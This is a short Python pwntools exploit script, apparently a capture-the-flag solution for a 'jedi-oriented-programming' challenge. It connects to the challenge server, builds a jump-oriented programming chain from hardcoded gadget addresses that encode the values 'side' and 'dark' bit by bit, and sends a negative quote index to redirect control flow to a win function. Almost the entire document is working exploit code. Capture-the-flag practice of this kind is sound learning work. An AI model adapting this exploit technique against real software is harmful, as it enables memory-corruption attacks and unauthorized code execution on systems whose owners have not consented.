from pwn import *
#io = process("./jedi.bin")
io = remote("spaceheroes-jedi-oriented-programming.chals.io", 443, ssl=True, sni="spaceheroes-jedi-oriented-programming.chals.io")

setupGadget = 0x4013a0
dispatcher = 0x401320

clearRdi = 0x401380
rdiToRsi = 0x401340

win = 0x4013e0

def setRdi(num):
    jopChain = b""
    addRdi = 0x4013d0
    shiftLeftRdi = 0x401360
    
    binary = bin(num)[2:]
    for bit in binary:
        if bit == "1":
            jopChain += p64(shiftLeftRdi)
            jopChain += p64(addRdi)
        elif bit == "0":
            jopChain += p64(shiftLeftRdi)

    return jopChain


dispatchTable  = b"A" * 8
dispatchTable += setRdi(0x73696465)
dispatchTable += p64(rdiToRsi)
dispatchTable += p64(clearRdi)
dispatchTable += setRdi(0x6461726b)
dispatchTable += p64(win)

io.sendlineafter("Please enter your favorite jedi quote: ",dispatchTable)
io.sendlineafter("Which quote number do you want to be?","-2036")
io.sendlineafter("Which jedi said that?",p64(setupGadget))

io.interactive()
